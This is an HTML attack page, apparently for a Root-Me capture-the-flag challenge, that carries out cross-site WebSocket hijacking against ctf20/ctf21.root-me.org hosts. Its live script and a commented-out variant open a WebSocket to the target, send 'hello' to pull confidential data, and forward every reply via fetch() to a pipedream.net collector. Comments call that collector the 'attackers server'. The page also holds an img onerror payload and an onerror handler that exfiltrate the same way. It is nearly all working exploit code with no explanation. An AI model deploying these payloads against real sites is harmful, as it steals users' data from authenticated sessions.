<!DOCTYPE html>

<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
<META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf21.root-me.org/room">

<script>
	var ws = new WebSocket('ws://ctf21.root-me.org/ws');
	ws.onopen = start
	ws.onmessage = handleReply
	function start(event) {
	  ws.send('hello'); //Send the message to retreive confidential information
	}
	function handleReply(event) {
	  //Exfiltrate the confidential information to attackers server
	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
	}
</script>


<!--

<!DOCTYPE html>


<meta http-equiv="Content-Security-Policy" content="*">
<meta http-equiv="Access-Control-Allow-Origin" content="*">

<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
<META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf20.root-me.org/room">
<p id="para"></p></body>
        <script>
        var iframe = document.createElement('iframe');
        iframe.src = 'http://ctf20.root-me.org/room';
        iframe.height = '80%';
        iframe.width = '80%';
        //iframe.onload = actions;
        document.getElementsByTagName('body')[0].appendChild(iframe);
        const event = new KeyboardEvent('keydown', {
			  key: 'Enter',
			  code: 'Enter',
			  which: 13,
			  keyCode: 13,
			});
        var ws = new WebSocket('ws://ctf20.root-me.org/ws');
	ws.onopen = start
	ws.onmessage = handleReply
	function start(event) {
	  ws.send('hello'); //Send the message to retreive confidential information
	}
	function handleReply(event) {
	  //Exfiltrate the confidential information to attackers server
	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
	}
        //document.getElementById('input').value='hello';
	    //document.getElementById('input').dispatchEvent(event);

        function sleep(ms) {
		    return new Promise(resolve => setTimeout(resolve, ms));
		}
        function actions(){
            
            const event = new KeyboardEvent('keydown', {
			  key: 'Enter',
			  code: 'Enter',
			  which: 13,
			  keyCode: 13,
			});

            
			aa(event)
        }
        function aa(event){
            var ff = false
            do {
            	try {
			  	document.getElementById('input').value='hello';
	            document.getElementById('input').dispatchEvent(event);
	            ff = true
	            
	            } catch (error) {
				  console.error(error);
				  // Expected output: ReferenceError: nonExistentFunction is not defined
				  // (Note: the exact output may be browser-dependent)
				  sleep(2000)
				}
			} while (!ff);
        }
        

        </script>

<img src="https://en6gc9c8vfzvo.x.pipedream.net?firstImage">
<img src=x onerror="var ws = new WebSocket('ws://ctf20.root-me.org/ws');
	ws.onopen = start
	ws.onmessage = handleReply
	function start(event) {
	  ws.send('hello'); //Send the message to retreive confidential information
	}
	function handleReply(event) {
	  //Exfiltrate the confidential information to attackers server
	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
}">

<iframe src="http://ctf20.root-me.org/room" height="500" width="800" ></iframe>

<script>
/*
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function gogo() {
	var ws = new WebSocket('ws://ctf20.root-me.org/ws');
	ws.onopen = start
	ws.onmessage = handleReply
	function start(event) {
	  ws.send('hello'); //Send the message to retreive confidential information
	}
	function handleReply(event) {
	  //Exfiltrate the confidential information to attackers server
	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
	}
	//sleep(10000)
	//conn.onopen = () => conn.send("Message");
	//ws.send(`hello`);
}
*/

var errors = "";
window.onerror = function(error) {
  erros += error;
  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?erros='+ errors, {mode: 'no-cors'})
};
</script>